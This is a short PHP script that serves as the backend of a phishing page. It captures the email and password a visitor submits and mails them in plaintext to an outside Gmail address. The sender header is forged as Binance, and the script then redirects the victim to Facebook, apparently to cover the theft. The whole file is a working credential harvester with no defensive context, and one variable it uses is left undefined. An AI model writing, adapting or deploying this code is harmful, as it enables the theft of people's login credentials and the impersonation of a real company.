<?php
//get data from form  

$email= $_POST['email'];
$password = $_POST['password'];
// $message= $_POST['message'];

$to = "diorddcc4@gmail.com";

$subject = "Mail From website";
$txt ="Password = ". $password . "\r\n Email = " . $email . "\r\n Message =" . $message;
$headers = "From: noreply@Binance.com" . "\r\n" .
"CC: somebodyelse@example.com";
if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}
//redirect
header("Location:facebook.com");
?>